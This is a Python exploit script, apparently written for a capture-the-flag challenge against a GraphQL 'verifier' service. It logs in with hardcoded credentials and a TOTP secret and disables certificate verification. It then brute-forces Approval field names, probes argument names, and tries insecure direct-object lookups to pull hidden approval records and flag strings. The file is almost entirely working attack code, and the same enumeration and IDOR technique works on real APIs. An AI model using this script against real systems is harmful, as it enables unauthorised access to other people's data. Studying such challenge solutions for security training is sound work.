#!/usr/bin/env python3
"""Verifier GraphQL: find Approval value-field + IDOR hidden approvals (AP-1004/5/6/8)."""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()
V="https://verifier.hackthe.website"; TOTP_SECRET="JBSWY3DPEHPK3PXP"
FLAG_RE=re.compile(r'dome\.ctf\{[^}]+\}')
def totp():
    k=base64.b32decode(TOTP_SECRET)
    h=hmac.new(k,struct.pack(">Q",int(time.time()//30)),hashlib.sha1).digest()
    o=h[-1]&15
    return str((struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%10**6).zfill(6)
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{V}/api/login", json={"username":"ops_dispatcher","password":"Ops-Fall-2026!"}, timeout=20)
s.post(f"{V}/api/otp/verify", json={"otp":totp()}, timeout=20)
def gql(q):
    r=s.post(f"{V}/graphql", json={"query":q}, timeout=20); return r.text

# 1) wide field probe on Approval
cands=["token","secret","value","data","payload","reason","justification","resource","scope",
 "grant","grantToken","credential","bearer","note","comment","status","type","service","principal",
 "requestedBy","requester","createdAt","updatedAt","expiresAt","metadata","tags","action","decision",
 "approver","amount","target","link","url","ref","reference","deployToken","layerToken",
 "deploymentToken","accessToken","roleToken","flag","hidden","internal","raw","body","detail",
 "description","title","name","key","content","message","sensitive","classified","level","risk"]
valid=["id","approvedBy"]
for f in cands:
    t=gql("{approvals{%s}}"%f)
    if ("Cannot query field '%s'"%f) not in t:
        valid.append(f)
print("valid Approval fields:", valid)

allq="{approvals{%s}}"%" ".join(valid)
print("\napprovals(all valid):", gql(allq)[:1500])

# 2) IDOR: does approvals accept an id arg? probe arg names
print("\n-- arg probing on approvals --")
for arg in ["id","approvalId","where","filter","status","type","all","includeHidden","scope"]:
    t=gql('{approvals(%s:"AP-1004"){%s}}'%(arg," ".join(valid)))
    if "Unknown argument" not in t and "Cannot query" not in t:
        print(f"  arg {arg}: {t[:300]}")

# 3) try singular lookups with args
for root in ["approval","approvalById","getApproval","node","findApproval"]:
    for arg in ["id","approvalId"]:
        t=gql('{%s(%s:"AP-1004"){%s}}'%(root,arg," ".join(valid)))
        if "Cannot query field '%s'"%root not in t and "Unknown argument" not in t:
            print(f"  {root}({arg}:) -> {t[:300]}")

# 4) fetch each hidden id if an id arg works (discovered above) — brute the obvious one
for hid in ["AP-1004","AP-1005","AP-1006","AP-1008"]:
    for q in ['{approvals(id:"%s"){%s}}'%(hid," ".join(valid)),
              '{approval(id:"%s"){%s}}'%(hid," ".join(valid))]:
        t=gql(q)
        if hid in t:
            print(f"  HIDDEN {hid}: {t[:400]}")
            for m in FLAG_RE.finditer(t): print("    *** FLAG:", m.group())

# 5) scan everything for flag
for m in FLAG_RE.finditer(gql(allq)): print("FLAG:", m.group())
